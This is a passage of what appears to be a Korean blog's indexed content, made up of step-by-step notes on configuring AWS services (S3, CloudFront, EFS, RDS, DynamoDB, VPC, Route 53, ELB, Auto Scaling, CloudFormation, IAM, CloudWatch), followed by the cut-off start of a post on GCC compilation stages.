시켜주고, default 페이지를 설정해 준다. 웹사이트 hosting 외에 redirect도 수행해 줄 수 있다. 설정을 완료하고 다시 \u0026lsquo;속성\u0026rsquo; 항목에서 웹사이트 호스팅 내용을 보면 URL이 적혀있다. URL로 접속하면 403 Forbidden이 뜬다. index.html이 없고 public이 아니라서 그렇다. index.html을 넣고 public으로 설정해 주면 정상적으로 접속이 된다. Cloud Front 연동 버킷을 생성하고, 데이터를 넣어둔다.\nCloudFront 서비스를 검색, Distribution 메뉴에 진입한다.\n\u0026lsquo;Create Distribution\u0026rsquo; 선택\n(1)에서 생성한 버킷을 설정한다. 원하는 설정을 조정하고, 마지막 \u0026lsquo;settings\u0026rsquo;의 \u0026lsquo;Default root object\u0026rsquo;에 html 이름을 입력한다. 생성을 완료하면 distribution메뉴에서 생성된 내용을 확인 가능하다.\nLast Modified : deploying은 업로드 진행중을 뜻하고, 업로드가 완료되면 완료된 날짜가 뜬다. 생성된 distribution에 들어가 distribution domain name을 복사한다.\n복사된 url을 사용하여 (1)에서 생성한 버킷의 원하는 데이터를 참조할 수 있다.\n그냥 버킷의 url을 사용하면 S3에서 가져오는 것이고, Cloud Front의 URL을 사용하면 CloudFront를 거쳐서 오는 경로이다. ex) https://fastrollingbean.s3.sa-east-1.amazonaws.com/cloudfront/AWS.mp4 ex) https://dx0b54w9entj1.cloudfront.net/cloudfront/AWS.mp4 Cloud Front에서 distribution 선택, \u0026lsquo;create invalidation\u0026rsquo;선택, refresh할 파일의 절대 경로를를 입력하면 즉시 refresh 할 수 있다.\nindex.html을 S3에 적힌 주소를 열어도 Cloud Front가 설정되어 있다면 Cloud Front를 통해서 내용을 받아온다. EFS 생성 및 연동 EFS 생성 EFS이름 설정, 사용할 VPC 선택(없으면 default), 가용성 선택(리전 및 AZ설정) EC2에서 보안그룹 설정 이름 설정, VPC 선택, 인바운드 규칙 설정 EFS 설정 생성된 EFS 선택하여 진입 \u0026lsquo;네트워크\u0026rsquo; 탭 선택 후 \u0026lsquo;관리\u0026rsquo; 버튼 클릭 \u0026lsquo;탑재대상\u0026rsquo; 리스트에 EFS가 생성된 리전의 AZ들이 보인다. AZ들\u0026rsquo;보안그룹\u0026rsquo; 은 모두 삭제 후 (2)에서 생성한 보안그룹을 설정해 준다. 연결 생성된 EFS를 선택한 화면에서 \u0026lsquo;연결\u0026rsquo; 버튼을 클릭 팝업창에서 DNS/IP 에 따른 탑재 방법을 선택가능하다. DNS를 사용하면 명령어 한 줄로 mount를 시킬수 있고(sudo mount -t efs -o tls fs-d81999b8:/ efs) IP를 사용하면 NFS 클라이언트 사용하여 AZ마다 일일이 연결해 줘야한다. EC2 생성 생성시 (3)인스턴스 구성 옵션에서 \u0026lsquo;퍼블릭IP자동할당\u0026rsquo;=활성화, 파일시스템을 추가, 위에서 생성한 EFS 선택 EFS 연결 경로는 /mnt/efs/fs1 으로 설정 보안그룹도 이미 생성했으므로 보안그룹 자동 생성 체크박스를 해제 EC2 접속하여 EFS 접속 확인\ndf -h 명령으로 확인하면 /mnt/efs/fs1 경로에 파일 시스템이 mount된 것을 확인할 수 있다. 해당 파일 시스템 안에 내용을 수정하면 즉각적으로 다른 EC2에서도 수정된 것을 확인 가능하다. 이미 생성된 EC2에 EFS 시스템을 적용\nsudo mkdir -p /mnt/efs/fs1 로 디렉터리를 생성한다. sudo mount -t efs -o tls fs-d81999b8:/ /mnt/efs/fs1 명령어로 생성한 디렉터리에 파일시스템을 mount를 해주면 된다. 단, 기본 AMI에는 EFS 툴이 없기 때문에 sudo yum install -y amazon-efs-utils 명령어를 통해 EFS 툴을 설치하고 위 명령어를 수행해야 한다. mysql instance 실행 RDS 검색하여 진입, 데이터베이스 메뉴에서 생성 클릭 엔진유형 선택, 버전 선택 성능에 따라 템플릿 선택, 클래스 설정 DB 접근을 위한 ID/비밀번호 설정 서브넷 그룹 필요에 따라 설정 외부 접근이 필요한 경우 public access 설정 보안그룹을 새로 만들면 3306 mysql 포트가 새로 설정된다. DB 인증은 암호에 추가로 다른 인증방법을 넣을 수 있다. 생성에 5분정도 시간이 소요된다. workbench 실행 mysql DB에 접속이 가능한 Client 프로그램 workbench 프로그램 홈 화면의 Mysql Connections 의 +버튼을 클릭한다. 혹은 상단 메뉴의 Database -\u0026gt; connection를 선택한다. 생성된 RDS의 정보창에서 엔드포인트, 포트를 확인하고 입력란에 host 정보를 기입한다. RDS 생성시 설정한 DB 계정 이름과 비밀번호를 입력하여 접속한다. workbench에서 쿼리 실행 접속에 성공하면 새로운 탭이 뜬다. 각종 쿼리를 활용하여 DB를 조작한다. ex) show databases;\ruse mysql;\rshow tables;\rselect * from db;\rdesc db; mysql RDS 수정 원하는 RDS 항목을 선택하고 \u0026lsquo;수정\u0026rsquo; 버튼을 클릭한다. 생성시 설정한 대부분의 내용들을 수정할 수 있다. 간혹 설정이 변경되면 에러가 나는 경우가 있는데, 이는 AZ가 해당 설정을 지원하지 않는 경우이다. 프리티어를 선택하였을 때 발생할 수 있는 문제이다. RDS 삭제 삭제시 스냅샷을 남길지, 자동 백업 기능을 남길지 등을 선택한다. 지울시 복구가 불가능한 경고문을 확인하였음을 체크하고 삭제가 가능하다. DynamoDB 생성 dynamoDB 검색 후 진입 \u0026lsquo;테이블 만들기\u0026rsquo; 선택 테이블 이름 설정 파티션키, 정렬키 설정(대소문자 구분) 생성된 테이블 선택 후 \u0026lsquo;항목\u0026rsquo; 탭 선택 \u0026lsquo;항목 만들기\u0026rsquo; 선택 후 내용 기입하면 된다. +를 눌러서 추가 데이터 기입 가능 파티션키와 정렬키는 필수 Append : 뒤에 이어붙이기 Instert : 위에 이어붙이기 항목만들기 한번에 \u0026lsquo;항목\u0026rsquo; 하나가 생성된다. DynamoDB 검색 \u0026lsquo;항목\u0026rsquo; 탭에서 UI를 통해 쿼리를 만들어 항목을 검색할 수 있다. 다른 key를 이용해 \u0026lsquo;인덱스\u0026rsquo; 탭에 들어가 \u0026lsquo;인덱스 생성\u0026rsquo;을 클릭한다. 새로운 파티션키와 정렬키를 추가로 정의하고(GSI), 이를 이용해 검색을 할 수 있다. GSI(global secondary index): 테이블 생성시 정의한 파티션키와 정렬키 외에 다른 속성으로 만든 key key 정의시 \u0026lsquo;타입\u0026rsquo;도 영향을 준다. ex)문자열과 숫자는 \u0026lsquo;항목\u0026rsquo; 탭에서 표기되는 내용은 같아도 실제로는 다른 값이므로 검색시 다르게 필터링될수 있다. VPC 생성(마법사) VPC 메뉴 검색 및 진입 좌측 메뉴에서 \u0026lsquo;탄력적IP\u0026rsquo; 선택, IP를 할당 public IP=공인IP, 탄력적IP=고정IP 할당받은 IP를 직접 연결하거나 instance 생성시 연결 가능 VPC 대시보드 메뉴로 진입, \u0026lsquo;VPC마법사 시작\u0026rsquo; 선택 원하는 구조에 따라 선택 사항을 선택한다. 우측에 그림으로 잘 묘사되어 있다. VPC는 논리적인 것임으로 원한다면 계속 추가할 수 있다. 선택 후 public 및 private instance 이름 및 가용영역을 설정하고, 위에서 할당받은 탄력적IP를 기입해 주면, 해당 IP를 이용한 VPC가 생성된다. 시간이 약간 걸릴 수 있다. 대시보드에서 이전과 비교하면 라우팅테이블, 서브넷, 인터넷 게이트웨이, 네트워크 ACL, 보안그룹 등이 신규로 추가됨을 확인할 수 있다. VPC 생성(수동) 탄력적 IP 생성\n일반적으로는 public IP (공인IP)를 사용하여 외부와 통신을 할 수 있지만, 탄력적IP는 사설IP를 외부 IP로 연동시키기 위해 사용하는 것 VPC메뉴로 이동, VPC 생성\nVPC만 생성하여 시간이 별로 걸리지 않는다. 내부 구성이 아무것도 없는 상태 서브넷으로 이동, 서브넷 생성\n서브넷은 원하는만큼 생성 가능하다. 원하는 VPC를 선택하고, 주소 및 이름 입력하여 생성 인터넷 게이트웨이로 이동, 인터넷 게이트웨이 생성\n게이트웨이는 물리적인 구조이고 가지고 있는 정보가 별로 없다. 연결만 시켜주면 알아서 동작하는 개체 생성하면 게이트웨이는 detached되어있다. VPC에 연결이 필요하다. 생성된 게이트웨이를 클릭하여 VPC에 연결\n우클릭하여 VPC에 연결 선택 원하는 VPC 선택(게이트웨이가 없는 VPC만 보여진다) 연결 후에는 attached로 표기가 변경된다. NAT 게이트웨이 항목으로 이동, NAT게이트웨이 생성\n서브넷을 설정해 준다. NAT는 public 서브넷에 연결되어 private 서브넷이 외부와 통신할 수 있게 하는 용도이다. 위에서 생성한 public 서브넷에 설치해야 한다. 위에서 생성한 탄력적 IP를 선택한다. (사용되지 않은 IP만 보여진다.) NAT 게이트웨이는 사설IP를 공인IP로 변경시켜준다. 생성을 완료하면 pending으로 되어있다. 라우팅테이블을 생성해 연결을 해주어야 available이 된다. 라우팅 테이블 항목으로 이동, 라우팅 테이블 생성\n라우팅 메뉴에 진입하면 생성하지 않았지만 우리가 위에서 생성한 VPC에 대한 라우팅 테이블이 기본적으로 있다. VPC는 자체가 사설망이기 때문에 생성과 동시에 라우팅 테이블을 갖는다. 자동으로 생성된 라우팅 테이블은 private망으로 보면 된다. 우리가 추가로 생성할 라우팅 테이블은 public용 라우팅 테이블이다. 라우팅 테이블을 설정할 VPC 선택하여 생성 생성된 public 라우팅 테이블을 클릭하여 세부정보에서 라우팅 선택, 라우팅 편집 선택 public 라우팅 테이블은 0.0.0.0/0에 대해 \u0026lsquo;인터넷 게이트웨이\u0026rsquo;로 라우팅을 해주어야 한다. 알맞게 설정해 준다. VPC생성시 자동으로 할당된 private 라우팅 테이블을 선택, 라우팅 선택, 라우팅 편집 선택 0.0.0.0/0 에 대해 \u0026lsquo;NAT 게이트웨이\u0026rsquo;로 연결되도록 설정 후 저장 서브넷에 라우팅테이블 적용\n방법1) public 라우팅 테이블의 세부 정보에서 서브넷연결 선택, 서브넷 연결 편집 선택\n이용가능한 서브넷 리스트에서 public용으로 만든 서브넷을 선택하고 연결저장 선택한 서브넷은 이제 public 라우팅 테이블이 적용된다. 방법2) 서브넷 메뉴에서 설정을 원하는 서브넷을 선택하고 세부정보에서 라우팅테이블 선택, 라우팅테이블 편집 선택\n위에서 편집한 라우팅테이블을 찾아 서브넷에 적용한다.\n-\u0026gt; 서브넷 설정이 완료되면 NAT게이트웨이 메뉴로 진입하면 위에서 생성한 NAT게이트웨이가 available 상태로 변경된 것을 확인할 수 있다. peering을 통한 서브넷간 연결 VPC 서비스에서 좌측 메뉴 중 \u0026lsquo;피어링 연결\u0026rsquo; 메뉴 진입, 피어링 생성 현재 리전에서 연결할 VPC 선택 연결할 상대 VPC 선택(리전 및 사용자 설정) 상대방 vpc의 VPC ID 를 복사해서 기입해 준다. peering 생성 peering을 요청한 계정-리전의 VPC 서비스에서 \u0026lsquo;피어링 연결\u0026rsquo; 메뉴로 진입 (1)에서 요청한 내용이 떠있음을 확인하고 우클릭하여 수락을 진행한다. 라우팅 테이블에 peering 주소 추가 peering을 한 각 VPC의 라우팅 테이블 메뉴에 진입하여, 연결한 서브넷에 적용된 라우팅 테이블을 선택, 세부정보의 \u0026lsquo;라우팅\u0026rsquo; 메뉴에 들어가 라우팅 테이블 편집 서로 상대방의 주소를 입력하고, 피어링 타입으로 추가한다. EC2 instance 생성하여 테스트 퍼블릭 IP를 활성화 한다.\n보안그룹 설정시 \u0026lsquo;모든그룹\u0026rsquo; 에 대해 \u0026lsquo;모든프로토콜\u0026rsquo;, \u0026lsquo;모든 포트\u0026rsquo;에 대해 peering 상대방 주소를 입력해 준다.\n리전이 바뀌면 다른 리전에서 사용된 key를 사용할 수 없다. 새로 생성해야 한다. 반대쪽 peering 대상에서도 마찬가지로 동일한 설정으로 생성을 한다.\nputty로 접속하여 각각 ifconfig로 사설IP주소를 확인한 후 서로 사설IP로 ping을 날려본다.\nping이 정상적으로 간다면 성공 subnet을 잘못 설정하거나 보안그룹 설정을 잘못한 경우 정상적으로 ping이 날아가지 않을 수 있다. 보안그룹 설정 ssh 접속 제한 원하는 instance 를 선택하여 해당 instance에 적용된 \u0026lsquo;보안그룹\u0026rsquo;을 찾는다. 해당 보안그룹으로 가서 inboud rule을 편집한다. 기본으로 주어진 ssh 프로토콜 rule을 제거하면 ssh로 접속이 되지 않는다. 원하는 IP로만 ssh 접속을 할 수 있게 ssh프로토콜에 \u0026lsquo;내 IP\u0026rsquo; 로 rule을 추가한다. 현재 접속된 컴퓨터로만 ssh가 접속이 된다. route53으로 도메인 등록 route53 서비스 검색 후 접속\n원하는 도메인 네임 검색하여 가격 확인 후 구매 진행\n구매는 1년단위로 연장할 수 있으며, 구매시 개인정보입력 및 이메일 인증이 필요하다. 같은 이름이라도 prefix에 따라 (.com, .net 등)비용이 다르다. 구매한 name서버를 다른 name서버 서비스에 옮겨서도 1년간 사용할 수 있다. ※구매한 도메인 이름을 \u0026lsquo;mydomain.com\u0026rsquo; 이라고 가정한다. \u0026lsquo;호스팅영역\u0026rsquo; 메뉴로 진입하여 \u0026lsquo;호스팅영역 생성\u0026rsquo;을 진행한다.\n도메인 이름에 mydomain.com을 입력하고 퍼블릭호스팅영역 설정으로 생성하면 된다. 이미 동일한 이름의 호스팅영역이 있다면 따로 만들지 않고 그대로 사용하면 된다. 동일한 이름이 두 개 이상 있을 경우 로직이 꼬일 수 있으므로 추천하지 않는다. 도메인 안에서는 레코드를 추가할 수 있다. 레코드란 주소를 저장하는 방식/내용에 따라 분류된다. NS : 도메인의 네임서버 레코드 SOA : 도메인 관련 정보,권한 관리 레코드 A : IP주소와 도메인 네임을 저장하는 레코드 CNAME : 도메인네임을 도메인네임과 저장하는 레코드 호스팅영역을 생성하면 NS(Name Server), SOA(Start of Authority) 레코드가 기본으로 생성되어 있다. S3와 route 53 연동 S3서버 생성\n웹서버용 S3 생성 버킷 이름을 mydomain.com 으로 설정한다. 버킷 생성 후 속성-\u0026gt;정적웹사이트호스팅 웹사이트 호스팅 활성화, 호스팅 유형=정적웹사이트호스팅 메인페이지를 index.html로 설정 리다이렉션용 S3 생성 버킷 이름을 www.mydomain.com 으로 설정한다. (원한다면 www대신 다른 것으로 넣어도 된다) 버킷 생성 후 속성-\u0026gt;정적웹사이트호스팅 웹사이트 호스팅 활성화, 호스팅 유형=객체에 대한 요청 리다이렉션 호스팅 이름 설정에 \u0026lsquo;mydomain.com\u0026rsquo; 기입\n-\u0026gt; 본 S3서버의 주소로 접속하면 \u0026lsquo;mydomain.com\u0026rsquo;으로 접속된다. A_레코드 생성\n웹 호스팅용 S3서버에 도메인 주소를 연결하는 작업이다. route 53 시스템에서 \u0026lsquo;호스팅 영역\u0026rsquo;메뉴로 진입 \u0026lsquo;호스팅 영역\u0026rsquo; 메뉴에서 위에서 생성된 호스팅 영역을 선택하고 \u0026lsquo;레코드 생성\u0026rsquo; 을 클릭한다. S3서버의 이름이 레코드 이룸과 같아야 한다. 레코드 이름 앞에 suffix를 붙일 수 있는데, 우리는 \u0026lsquo;mydomain.com\u0026rsquo; 앞에 suffix가 없으므로 생략한다. 레코드 유형=A-IPv4 트래픽라우팅 대상 설정에서 \u0026lsquo;별칭\u0026rsquo; 모드로 설정하여 \u0026lsquo;S3웹사이트 엔드포인트에대한 별칭\u0026rsquo; 선택, 리전선택, (1)에서 생성한 웹호스팅용 S3 선택 mydomain.com 으로 접속시 웹호스팅 S3서버의 index.html이 보여진다. CNAME_레코드 생성\n리다이렉션 S3서버에 도메인 주소를 연결하는 작업이다. 리다이렉션 S3서버는 이미 자신의 주소를 가지고 있다. route 53 시스템에서 \u0026lsquo;호스팅 영역\u0026rsquo;메뉴로 진입 \u0026lsquo;호스팅 영역\u0026rsquo; 메뉴에서 위에서 생성된 호스팅 영역을 선택하고 \u0026lsquo;레코드 생성\u0026rsquo; 을 클릭한다. 레코드 이름에 prefix로 \u0026lsquo;www\u0026rsquo;를 넣어준다. S3서버의 이름이 레코드 이룸과 같아야 한다. 레코드 이름 앞에 suffix를 붙일 수 있는데, S3서버의 이름과 동일해지도록 한다. (www대신 다른 이름을 적었다면 알맞게 기입) 레코드 유형=CNAME \u0026lsquo;별칭\u0026rsquo; 토글을 off한다. 값에 리다이렉션용 S3 주소를 입력한다. (\u0026lsquo;http://\u0026lsquo;는 제외하고 www부터 입력한다.) www.mydomain.com으로 접속시 리다이렉션 S3를 통해 웹호스팅 S3서버의 index.html이 보여진다.\n-\u0026gt; 웹호스팅용 S3서버는 CNAME 레코드 생성이 안됨에 주의한다. ELB 생성 VPC 서비스를 검색하여 서브넷 메뉴로 진입, 서브넷 2개 생성(public1, public2)\n이름 및 가용영역 설정, IPv4 CIDR 설정 라우팅 테이블 메뉴로 진입, 라우팅테이블 생성\n생성된 라우팅테이블 선택 후 세부 속성에서 \u0026lsquo;서브넷 설정\u0026rsquo; 선택, 서브넷연결 편집 실행 생성된 서브넷 선택하여 세부 속성에서 라우팅 테이블 탭을 선택하면 안됨, 이는 기본적으로 생성된 내부 연결을 위한 라우팅 테이블이다. EC2 서비스 검색 후 EC2 메뉴로 진입, EC2 instance 2개 생성\n위에서 조작한 VPC, 서브넷을 설정한다. (한개는 public1, 한개는 public2 서브넷을 선택한다) 퍼블릭IP 자동 할당=활성화 각 EC2에 웹서버 구성\nsudo yum install httpd sudo systemctl start httpd.service sudo systemctl enable httpd.service sudo groupadd www sudo usermod -a -G www ec2-user reset cd /var/www sudo chown -R root:www /var/www sudo chmod 2775 /var/www/html cd html vi index.html 후 적당한 내용 작성(EC2-1, EC2-2 서로 내용 다르게) ELB 생성\nEC2 서비스 메뉴에서 로드벨런서 메뉴를 찾아 진입한다. Application 로드밸런를 생성한다. VPC를 선택하고, 가용영역에서 subnet을 선택한다. 보안 설정 구성은 보안 관련 서비스인데, 따로 설정하지 않아도 된다. 보안그룹을 선택해 주고, 라우팅 구성 창으로 넘어간다. 라우팅을 구성하면, 원하는 프로토콜에 대해 LB를 수행할 수 있다. 인스턴스를 대상으로 하고, HTTP 프로토콜에 80번 포트를 대상으로 한다. 고급 상태 검사 설정에서 업데이트 간격 등을 설정할 수 있다. 대상 등록 창에서 LB를 원하는 instance를 선택한다. instance는 앞서 선택한 subnet안에 있는 것들만 보여진다. 원하는 인스턴스 선택 후 추가를 누르면 대상그룹에 인스턴스가 추가된다. 대상그룹에 대상 등록(ELB생성시 5번을 하지 않은 경우)\n생성이 완료되면 \u0026lsquo;대상그룹\u0026rsquo; 메뉴에서 생성한 그룹을 확인할 수 있다. 방금 생성된 그룹을 선택하여 registerTarget를 수행한다. available instances들에서 원하는 인스턴스를 선택하여 \u0026lsquo;Include as pending below\u0026rsquo;, \u0026lsquo;Register pending targets\u0026rsquo; 를 눌러준다. 대상그룹의 상세 속성에서 Health status를 확인했을 때 initialize에서 healthy로 변경되면 정상적으로 수행된 것이다. 결과 확인\n로드밸런서를 들어가면 DNS주소가 생성되어있음을 확인할 수 있다. 해당 DNS 주소를 입력해 http로 접속하면 라운드로빈에 의해 EC2-1, EC2-2의 웹페이지 내용이 번갈아가며 보임을 확인할 수 있다. 인스턴스 하나를 종료시키고 대상그룹 메뉴에서 그룹을 선택하면 \u0026lsquo;health status\u0026rsquo;가 healthy에서 unused로 바뀜을 확인할 수 있다. 이때는 DNS로 접속을 해도 하나의 EC2로만 접속됨을 확인할 수 있다. sticky session\n대상그룹에서 원하는 그룹을 선택 후 \u0026lsquo;Attributes\u0026rsquo; 탭으로 진입해 수정을 누른다. Stickiness라는 메뉴가 확인되면 체크표시를 해 준다. 설정을 완료하면 DNS주소로 접근할 때 새로고침을 해도 최초 접속한 instance에 계속 접속됨을 확인할 수 있다. ALB는 쿠키 기반으로 세션을 잡아준다. stickiness 설정시 duration을 설정할 수 있는데, 접속 후 duration 만큼 시간이 지나면 다른 instance로도 접근이 가능해진다. Auto Scaling EC2 서비스를 검색하면 auto scaling 메뉴를 확인할 수 있다. 시작구성 생성\n시작구성 생성 메뉴를 선택해 진입한 후 시작구성 생성을 클릭한다. AMI 설정 : 내 AMI 혹은 market place에 해당하는 AMI를 검색해서 선택할 수 있다. 하지만 market place 이미지도 내 이미지로 당겨와서 넣는게 더 편함 인스턴스 유형 설정 : t2 micro로 선택한다. t2 micro로 해야 성능이 낮아 부하가 걸릴 수 있고, AZ에 영향을 받지 않고 아무곳에서나 생성이 가능하다. CloudWatch 모니터링을 체크한다. 보안그룹을 선택할 때 새로 생성하는 옵션은 없다. 기존 보안그룹을 선택한다. (보안그룹은 VPC에 의존적이다. 이후 인스턴스를 생성할 VPC에 해당하는 보안그룹을 정의해 줘야한다.) auto scaling 그룹 생성\nauto scaling 그룹 메뉴를 선택해 진입, auto scaling 생성 클릭 시작탬플릿 혹은 구성 선택 시작 탬플릿을 설정해야 한다. 하지만 우리는 탬플릿을 만든적이 없다. 탬플릿 대신 구성으로 변경해 설정할 수 있다. 시작구성으로 전환을 선택하여 (1)에서 생성한 시작구성을 선택한다. 설정 구성 VPC는 디폴트 VPC를 선택한다. 사설 VPC를 선택하면 오류가 날 가능성이 있다(?) 로드밸런서를 연결해서 사용할 수도 있다. 보통은 같이 가지만 지금은 없이 설정한다. 고급 옵션 구성 상태 확인 항목에서 로드 체크 주기를 설정한다. CloudWatch 모니터링 체크를 한다. 4)그룹크기 및 조정 정책 설정 최대,최소,기본 크기(EC2개수)를 설정한다. 조정정책을 사용함으로 설정하고, CPU 사용량에 따른 추적을 설정한다. 알림 설정 부하가 발생할 때 알림이 오도록 설정할 수 있다. 태그설정 결과 확인\nEC2를 만들지 않았다. 대상 설정을 따로 하지 않았다. 하지만 Auto scaling 그룹에 들어가서 생성된 그룹을 클릭, 인스턴스 관리 탭을 들어가면 생성된 인스턴스가 있다. healthy상태의 pending 인 인스턴스가 있다. 시간이 지나 pending이 inService가 되면 정상적으로 세팅된 것이다. 인스턴스 메뉴로 들어가면 인스턴스가 생성됨을 확인할 수 있다. EC2 생성할 때, \u0026lsquo;인스턴스 구성\u0026rsquo; 단계에서 auto scaling을 설정할 수도 있다. 강제 부하 생성, EC2 추가생성 확인\n생성된 instance에 putty로 진입하여 아래 명령어 입력 sudo amazon-linux-extras install -y epel sudo yum install -y stress stress -c 1 생성한 그룹에서 모니터링 탭을 선택하면 현재 상태를 그래프로 확인할 수 있다. 최소 1시간단위밖에 안돼서 즉시 보기는 힘들다. 인스턴스 탭에서 인스턴스가 늘어났는지 확인한다. 지표를 60초 단위로 주었으니 auto scale에서 의사결정을 하여 scale out을 수행할 것이다. 인스턴스가 두개로 늘어났다면, 다시 putty로 돌아가 stress process를 Ctrl+C로 종료시키고, auto scale에 의해 scale in 되는것을 다시 확인한다. 활동 탭에 들어가면 auto scaling 동작에 대한 로그가 남아있다. Cloud Formation 검색창에 Cloud formation 검색 후 서비스 진입 EC2 stack 생성 업로드할 template파일 생성 *.template 이름으로 파일을 생성한다. AMI, instance type 등 세부 설정을 기입한다. 상세 내용은 샘플 파일을 참조한다. 탬플릿에는 stack에 대한 상세 설정이 묘사된다. 스택 메뉴를 선택하여 스택생성(새 리소스 사용)을 선택한다. 이후 준비된 템플릿 옵션을 선택하고 파일을 업로드 한다. 탬플릿을 디자이너로 만들거나 AWS에서 가져올 수 있는데, 우리는 탬플릿을 업로드하여 사용하도록 한다. 파일을 업로드하면 S3 URL이 생긴것을 확인 할 수 있는데, 이는 우리가 올린 stack 탬플릿을 S3에 자동으로 버킷이 만들어져서 업로드 된 것임을 알 수 있다. 스택 세부정보 입력 파라미터에 keyPair 이름을 넣어야 한다. 우리가 생성했던 key 이름과 같아야 한다. 현재 내가 만든 key를 보려면 \u0026lsquo;EC2\u0026rsquo; 서비스에서 \u0026lsquo;네트워크 및 보안\u0026rsquo; -\u0026gt; \u0026lsquo;키페어\u0026rsquo; 를 참조한다. 스택 옵션 구성 IAM에서 우리가 만들 stack이 수행할 수 있는 권한을 지정해 놓은 set을 미리 만들어 놓을 수 있는데, 지금은 그냥 넘어간다. 생성이 완료되면 상세 정보창으로 들어가진다. \u0026lsquo;이벤트\u0026rsquo;에서는 로그를 볼 수 있고, \u0026lsquo;리소스\u0026rsquo;에서는 생성된 객체들을 확인할 수 있다. EC2 서비스의 인스턴스를 확인해도 새로 생성된 인스턴스를 확인할 수 있다. S3 서비스에서 버킷 메뉴를 확인하면 cf-templates\u0026hellip; 형태의 버킷이 확인된다. 우리가 올린 탬플릿이 든 버킷이다. 웹서버 stack 생성 EC2생성 + 아파치 설치까지 적힌 탬플릿을 구성한다. (1-1)에서 수행한 내용을 동일하게 수행 인스턴스가 생성되고 해당 인스턴스의 퍼블릭IP로 진입하면 아파치 메인화면이 보임을 확인할 수 있다. IAM 이전에 보안key pair를 만들었을 때 IAM을 사용하였었다. IAM -\u0026gt; 사용자 -\u0026gt; 보안자격증명 -\u0026gt; 액세스 키 에서 우리가 생성한 키 확인 가능 그룹 생성\nIAM 서비스에서 사용자그룹 메뉴에 진입, 그룹 생성 클릭 이미 생성한 사용자가 있다면 그룹 생성과 동시에 사용자 추가 가능 권한정책에서 원하는 권한을 검색, 체크하여 부여 사용자 생성\n사용자 메뉴에 진입하여 사용자 생성 클릭 이름을 지정하고, 액세스 유형, 비밀번호 설정 후 다음 그룹에 사용자 추가를 클릭하고 다음 마지막 단계에서 생성한 내용에 대한 csv파일을 다운받을 수 있다. 이메일로 내용이 전송되게 할 수도 있다. 생성한 상세 메뉴에서 ARN 주소를 확인할 수 있는데, 이쪽으로 접근하면 자동으로 로그인 화면으로 접근된다. 사용자 권한 추가\n생성 완료된 사용자를 클릭하면 상세 내용중 \u0026lsquo;권한\u0026rsquo; 탭에서 \u0026lsquo;권한추가\u0026rsquo; 버튼을 클릭해 추가 가능 사용자 생성시와 같이 원하는 권한을 검색, 추가할 수 있다. 부여한 권한 삭제는 상세정보의 \u0026lsquo;권한\u0026rsquo; 탭에서 부여된 권한을 확인하고, 해당 row의 오른쪽 끝 X표시를 누르면 권한이 해제된다.\n-\u0026gt; 사용자 변경하여 인스턴스 생성시 권한이 없는 항목에 대해서는 생성이 불가능함을 확인 가능 역할 생성\nAWS 개체들이 수행할 수 있는 작업을 규정한다. IAM서비스에 접속하여 역할 메뉴 진입, 역할 만들기 선택 여러 종류들 중 원하는 개체 유형을 선택한다. (AWS서비스) 원하는 권한을 선택(보기에서는 S3서버 전체 권한) 후 다음 EC2를 생성하여 해당 역할을 할당 인스턴스 생성중 (3)인스턴스 구성 단계에서 IAM역할에 위에서 생성한 role을 설정한다. 인스턴스 생성 인스턴스에서 권한 확인 putty로 인스턴스 접속 후 아래 명령어 수행 aws s3 ls s3://hooon.com -\u0026gt; (OK) aws --region ap-northeast-2 dynamodb scan --table-name UserLeaderboard -\u0026gt; (AccessDeniedException) Cloud watch 인스턴스에 cloud watch 설정 인스턴스를 선택하여 \u0026lsquo;모니터링 및 문제해결\u0026rsquo; -\u0026gt; \u0026lsquo;세부 모니터링 관리\u0026rsquo; 진입, 모니터링 활성화 후 저장 Cloud watch에서 알람 설정 Cloudwatch 서비스에서 \u0026lsquo;경보\u0026rsquo; -\u0026gt; \u0026lsquo;경보상태\u0026rsquo; 메뉴 진입, 경보생성 클릭 지표 선택을 누르면 각 개체별 모니터링 가능한 지표들을 볼 수 있다. EC2를 선택 후 CPU utilization를 검색, 원하는 인스턴스의 CPU utilization 항목을 선택 해당 지표의 값에 대한 감지 조건 및 감지 사이클을 설정해 준 후 다음 클릭. 앞서 설정한 조건에 해당하면 어떤 조치를 취할지 설정 알람을 받을 메일 설정(이메일 인증도 있음) 어떤 알림을 보낼지 \u0026lsquo;주제\u0026rsquo;를 설정. 일반적인 주제를 보낼수도 있고, 새로운 주제 생성도 가능. 완료 후 다음 클릭 EC2에 들어가 부하를 발생하면 지정된 메일로 경보가 날아옴을 확인할 수 있다. ","permalink":"https://aswinblue.github.io/Blog/post/cloud/aws/","summary":"Aws Aws 로그인 root 로그인과 IAM 로그인이 있다. 필요한 권한만 할당된 IAM 계정을 사용하는 것이 안전하며, root는 외부로 공유되지 않게 하고 보안을 철저히 한다. Window 서버 생성 window 서버 vs Linux 서버\n중소기업쪽에서는 보안 및 관리할 것들이 줄어드는 Window 서버를 많이 선호하는 편이다. t 시리즈는 범용서버이다. t2.large는 꽤 큰 서버이다. 프리티어를 사용하면 일부 서비스를 무료로 사용할 수는 있지만, 성능이 좋지는 않다. 좌측상단 \u0026lsquo;서비스\u0026rsquo;를 선택, EC2를 찾아서 들어간다. (또는 검색창에서 EC2를 검색)","title":"Aws"},{"content":"GCC C / C++ 언어를 컴파일 해 주는 도구이다. 리눅스에서는 apt 명령으로 설치 가능하며, 윈도우에서는 Mingw을 이용하여 설치 가능하다. gcc는 컴파일러를 포함한 패키지일 뿐, 내부적인 컴파일러는 따로 있다. (cc1 등)\nGCC 컴파일 동작 순서 gcc main.c 파일을 동작시키면 main.c파일을 컴파일하여 실행파일인 a.out 파일을 생성하게 된다.\n하지만 내부적으로는 아래와 같은 과정을 거치게 된다.\n전처리 : c언어로 구현된 .c 파일을 전처리가 완료된 .i 파일로 변환한다.\ngcc -E main.c -o a.i : main.c 파일을 a.i 파일로 전처리 컴파일 : 전처리된 .i 파일을 어셈블리어로 변환\ngcc -S a.i -o a.s : a.i 파일을 a.s 어셈블리어로 어셈블 어셈블: 각 벤더들이 만든 어셈블리어를 목적파일로 변환(어셈블리 언어를 기계어로 변환) gcc -c a.s -o a.o : 어셈블리 파일을 목적 파일 EOL(Executable Linux File)로 변환. 하지만 바로 실행할 수는 없다. file a.o 명령어를 입력 해 보면 \u0026ldquo;LSB relocatable\u0026rdquo; 이라고 표시된다. 즉, 재배치 가능하다는 의미로, 실행 할 수 있는 상태는 아니라는 뜻이다. 링킹: 목적파일에서 참조하는 다른 목적파일들을 linking하여 최종 실행파일을 생성한다.\ngcc a.o -o out : a.o 목적파일로 실행 가능한 파일을 생성한다. file out 명령어를 입력 해 보면 \u0026ldquo;LBS 